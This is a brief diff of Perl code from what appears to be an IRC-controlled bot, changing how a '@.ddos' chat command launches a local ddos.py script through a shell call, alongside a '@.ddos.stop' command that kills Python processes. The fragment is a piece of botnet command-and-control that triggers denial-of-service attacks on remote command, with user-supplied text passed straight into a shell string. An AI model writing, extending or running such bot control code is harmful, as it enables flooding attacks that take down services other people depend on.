@@ -63,7 +63,7 @@ $irc->on(irc_privmsg => sub {
 
  }
  if ($msg =~ /@.ddos/) {
-  system 'python ddos.py ' . @ARGV; 
+  system './ddos.py ' . "@ARGV"; 
  }
  if ($msg =~ /@.ddos.stop/) {
   system 'pkill python'; 
